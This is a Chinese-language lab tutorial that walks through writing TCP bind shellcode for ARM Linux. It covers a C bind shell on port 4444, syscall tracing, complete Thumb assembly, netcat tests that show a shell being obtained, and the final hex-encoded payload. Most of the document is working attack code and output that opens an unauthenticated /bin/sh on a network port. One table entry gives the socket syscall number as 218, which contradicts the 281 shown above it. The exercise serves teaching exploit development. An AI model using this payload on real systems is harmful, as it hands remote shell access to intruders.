# <center>arm下编写tcp绑定shellcode</center>

## 实验概述

### 【目的】
编写arm下TCP绑定shellcode
### 【环境】
Linux
### 【工具】
qemu,socat
### 【原理】
shellcode是一段机器指令，用于在溢出之后改变系统的正常流程，转而执行shellcode从而入侵目标系统。
shellcode基本的编写方式：
- 编写c程序实现功能
- 使用汇编来替代函数调用等
- 汇编编译链接，获取机器码
## 实验步骤

### 【步骤】
一个TCP绑定shell，可以在目标机器上打开端口，等待主机接入，接入时向主机提供shell。首先，我们需要给出一个c语言程序来完成这个功能。
```c
#include <stdio.h> 
#include <sys/types.h>  
#include <sys/socket.h> 
#include <netinet/in.h> 

int host_sockid;    // socket file descriptor 
int client_sockid;  // client file descriptor 

struct sockaddr_in hostaddr;            // server aka listen address

int main() 
{ 
    // 创建新的TCP socket
    host_sockid = socket(PF_INET, SOCK_STREAM, 0); 

    // 初始化hostaddr结构体
    hostaddr.sin_family = AF_INET;                  
    hostaddr.sin_port = htons(4444);                // 服务端口
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);   // 收听任何地址

    // 将socket绑定到sockaddr结构体的IP/端口
    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr)); 

    // 监听传入的连接 
    listen(host_sockid, 2); 

    // 接受传入的连接 
    client_sockid = accept(host_sockid, NULL, NULL); 

    // 设置文件描述符STDIN, STDOUT and STDERR 
    dup2(client_sockid, 0); 
    dup2(client_sockid, 1); 
    dup2(client_sockid, 2); 

    // 执行 /bin/sh 
    execve("/bin/sh", NULL, NULL); 
    close(host_sockid); 

    return 0; 
}
```
这里可以先测试一下程序。
```
pi@raspberrypi:~ $ gcc bind.c -o bind
pi@raspberrypi:~ $ ./bind

```
此时服务端已经运行，另开一个ssh连接
```
pi@raspberrypi:~ $ netstat -tlpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      674/bind        
pi@raspberrypi:~ $ netcat -nv 0.0.0.0 4444
Connection to 0.0.0.0 4444 port [tcp/*] succeeded!
whoami
pi
id
uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),997(gpio),998(i2c),999(spi)
```
成功连接到绑定到端口的shell程序。


要改写c语言成shellcoe，首先需要确定必要的系统函数，参数，和它们的系统调用号。
经过观察，有如下函数：
- socket
- bind
- listen
- accept
- dup2
- execve

对于系统调用号，我们可以通过查看头文件来获得
```
pi@raspberrypi:~ $ cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep socket
#define __NR_socketcall			(__NR_SYSCALL_BASE+102)
#define __NR_socket			(__NR_SYSCALL_BASE+281)
#define __NR_socketpair			(__NR_SYSCALL_BASE+288)
#undef __NR_socketcall
```
可以看到socket的系统调用号为281，以此类推，我们可以检索上面所有函数的系统调用号。
```
#define __NR_socket    (__NR_SYSCALL_BASE+281)
#define __NR_bind      (__NR_SYSCALL_BASE+282)
#define __NR_listen    (__NR_SYSCALL_BASE+284)
#define __NR_accept    (__NR_SYSCALL_BASE+285)
#define __NR_dup2      (__NR_SYSCALL_BASE+ 63)
#define __NR_execve    (__NR_SYSCALL_BASE+ 11)
```
即我们有
函数|系统调用号
----|----
socket|218
bind|282
listen|284
accept|285
dup2|63
execve|11

那么如何确定调用函数时的参数呢，这里可以使用strace工具来追踪程序实时运行时的函数调用。
```
$  strace -e execve,socket,bind,listen,accept,dup2 ./bind
execve("./bind", ["./bind"], [/* 39 vars */]) = 0
socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = -1 EADDRINUSE (Address already in use)
listen(3, 2)                            = 0
accept(3, 0, NULL)                      = 4
dup2(4, 0)                              = 0
dup2(4, 1)                              = 1
dup2(4, 2)                              = 2
execve("/bin/sh", [0], [/* 0 vars */])  = 0
```

现在就可以开始编写汇编语言程序了，为了使shellcode更加紧凑，减少"\x00"这里我们要使用thumb模式来编写，要调用thumb模式，需要在开头写如下
```
.section     .text
.global     _start
_start:
    .ARM
    add     r3, pc, #1
    bx      r3
```
首先，我们要调用socket函数，在strace中，我们拿到的socket参数是宏定义的常量，要获取具体的值，需要查看头文件。
```
pi@raspberrypi:~ $ grep -R "PF_INET\| SOCK_STREAM =\|IPPROTO_IP =" /usr/include/
/usr/include/linux/in.h:  IPPROTO_IP = 0,		/* Dummy protocol for TCP		*/
/usr/include/netinet/in.h:    IPPROTO_IP = 0,	   /* Dummy protocol for TCP.  */
/usr/include/arm-linux-gnueabihf/bits/socket_type.h:  SOCK_STREAM = 1,		/* Sequenced, reliable, connection-based
/usr/include/arm-linux-gnueabihf/bits/socket.h:#define	PF_INET		2	/* IP protocol family.  */
/usr/include/arm-linux-gnueabihf/bits/socket.h:#define	PF_INET6	10	/* IP version 6.  */
/usr/include/arm-linux-gnueabihf/bits/socket.h:#define	AF_INET		PF_INET
/usr/include/arm-linux-gnueabihf/bits/socket.h:#define	AF_INET6	PF_INET6
```
可以看到，我们只需要调用socket(2,1,0)即可，那么就有汇编代码
```
 .THUMB
    mov     r0, #2
    mov     r1, #1
    sub     r2, r2, r2
    mov     r7, #200
    add     r7, #81                // r7 = 281 (socket syscall number) 
    svc     #1                     // r0 = host_sockid value 
    mov     r4, r0                 // save host_sockid in r4
```
接下来是bind函数，其中
```
$ grep -R "AF_INET" /usr/include/
/usr/include/arm-linux-gnueabihf/bits/socket.h:#define	AF_INET		PF_INET

```
所以我们有调用
```
// bind(r0, &sockaddr, 16)
    adr  r1, struct_addr   // pointer to address, port
    strb r2, [r1, #1]     // write 0 for AF_INET
    strb r2, [r1, #4]     // replace 1 with 0 in x.1.1.1
    strb r2, [r1, #5]     // replace 1 with 0 in 0.x.1.1
    strb r2, [r1, #6]     // replace 1 with 0 in 0.0.x.1
    strb r2, [r1, #7]     // replace 1 with 0 in 0.0.0.x
    mov r2, #16
    add r7, #1            // r7 = 281+1 = 282 (bind syscall number) 
    svc #1
    nop
```
同理，有listen函数
```
mov     r0, r4     // r0 = saved host_sockid 
mov     r1, #2
add     r7, #2     // r7 = 284 (listen syscall number)
svc     #1
```
aceppt函数
```
   mov     r0, r4          // r0 = saved host_sockid 
    sub     r1, r1, r1      // clear r1, r1 = 0
    sub     r2, r2, r2      // clear r2, r2 = 0
    add     r7, #1          // r7 = 285 (accept syscall number)
    svc     #1
    mov     r4, r0          // save result (client_sockid) in r4
```
dup2函数
```
 /* dup2(client_sockid, 0) */
    mov     r7, #63                // r7 = 63 (dup2 syscall number) 
    mov     r0, r4                 // r4 is the saved client_sockid 
    sub     r1, r1, r1             // r1 = 0 (stdin) 
    svc     #1
```
```
  /* dup2(client_sockid, 1) */
    mov     r0, r4                 // r4 is the saved client_sockid 
    add     r1, #1                 // r1 = 1 (stdout) 
    svc     #1
```
```
/* dup2(client_sockid, 2) */
    mov     r0, r4                 // r4 is the saved client_sockid
    add     r1, #1                 // r1 = 1+1 (stderr) 
    svc     #1
```

对于execve
```
// execve("/bin/sh", 0, 0) 
 adr r0, shellcode     // r0 = location of "/bin/shX"
 eor r1, r1, r1        // clear register r1. R1 = 0
 eor r2, r2, r2        // clear register r2. r2 = 0
 strb r2, [r0, #7]     // store null-byte for AF_INET
 mov r7, #11           // execve syscall number
 svc #1
 nop
```
最后，放置需要的字符串等变量
```
struct_addr:
.ascii "\x02\xff"      // AF_INET 0xff will be NULLed 
.ascii "\x11\x5c"     // port number 4444 
.byte 1,1,1,1        // IP Address 
shellcode:
.ascii "/bin/shX"
```

那么有最终的汇编代码
```
.section .text
.global _start
    _start:
    .ARM
    add r3, pc, #1         // switch to thumb mode 
    bx r3

    .THUMB
// socket(2, 1, 0)
    mov r0, #2
    mov r1, #1
    sub r2, r2, r2      // set r2 to null
    mov r7, #200        // r7 = 281 (socket)
    add r7, #81         // r7 value needs to be split 
    svc #1              // r0 = host_sockid value
    mov r4, r0          // save host_sockid in r4

// bind(r0, &sockaddr, 16)
    adr  r1, struct_addr // pointer to address, port
    strb r2, [r1, #1]    // write 0 for AF_INET
    strb r2, [r1, #4]    // replace 1 with 0 in x.1.1.1
    strb r2, [r1, #5]    // replace 1 with 0 in 0.x.1.1
    strb r2, [r1, #6]    // replace 1 with 0 in 0.0.x.1
    strb r2, [r1, #7]    // replace 1 with 0 in 0.0.0.x
    mov r2, #16          // struct address length
    add r7, #1           // r7 = 282 (bind) 
    svc #1
    nop

// listen(sockfd, 0) 
    mov r0, r4           // set r0 to saved host_sockid
    mov r1, #2        
    add r7, #2           // r7 = 284 (listen syscall number) 
    svc #1        

// accept(sockfd, NULL, NULL); 
    mov r0, r4           // set r0 to saved host_sockid
    sub r1, r1, r1       // set r1 to null
    sub r2, r2, r2       // set r2 to null
    add r7, #1           // r7 = 284+1 = 285 (accept syscall)
    svc #1               // r0 = client_sockid value
    mov r4, r0           // save new client_sockid value to r4  

// dup2(sockfd, 0) 
    mov r7, #63         // r7 = 63 (dup2 syscall number) 
    mov r0, r4          // r4 is the saved client_sockid 
    sub r1, r1, r1      // r1 = 0 (stdin) 
    svc #1

// dup2(sockfd, 1)
    mov r0, r4          // r4 is the saved client_sockid 
    add r1, #1          // r1 = 1 (stdout) 
    svc #1

// dup2(sockfd, 2) 
    mov r0, r4          // r4 is the saved client_sockid
    add r1, #1          // r1 = 2 (stderr) 
    svc #1

// execve("/bin/sh", 0, 0) 
    adr r0, shellcode   // r0 = location of "/bin/shX"
    eor r1, r1, r1      // clear register r1. R1 = 0
    eor r2, r2, r2      // clear register r2. r2 = 0
    strb r2, [r0, #7]   // store null-byte for AF_INET
    mov r7, #11         // execve syscall number
    svc #1
    nop

struct_addr:
.ascii "\x02\xff" // AF_INET 0xff will be NULLed 
.ascii "\x11\x5c" // port number 4444 
.byte 1,1,1,1 // IP Address 
shellcode:
.ascii "/bin/shX"
```
编译连接，查看功能是否正常
```
$ as bind_shell.s -o bind_shell.o && ld -N bind_shell.o -o bind_shell
$ ./bind_shell
```
打开另一个终端
```
$ netcat -vv 0.0.0.0 4444
Connection to 0.0.0.0 4444 port [tcp/*] succeeded!
uname -a
Linux raspberrypi 4.4.34+ #3 Thu Dec 1 14:44:23 IST 2016 armv6l GNU/Linux
```
功能正常，弹出了shell，获取十六进制码
```
$ objcopy -O binary bind_shell bind_shell.bin
$ hexdump -v -e '"\\""x" 1/1 "%02x" ""' bind_shell.bin
\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x20\x01\x21\x92\x1a\xc8\x27\x51\x37\x01\xdf\x04\x1c\x12\xa1\x4a\x70\x0a\x71\x4a\x71\x8a\x71\xca\x71\x10\x22\x01\x37\x01\xdf\xc0\x46\x20\x1c\x02\x21\x02\x37\x01\xdf\x20\x1c\x49\x1a\x92\x1a\x01\x37\x01\xdf\x04\x1c\x3f\x27\x20\x1c\x49\x1a\x01\xdf\x20\x1c\x01\x31\x01\xdf\x20\x1c\x01\x31\x01\xdf\x05\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\xc0\x46\x02\xff\x11\x5c\x01\x01\x01\x01\x2f\x62\x69\x6e\x2f\x73\x68\x58
```
### 【总结】

本次实验主要练习了arm下TCP绑定shellcode的编写。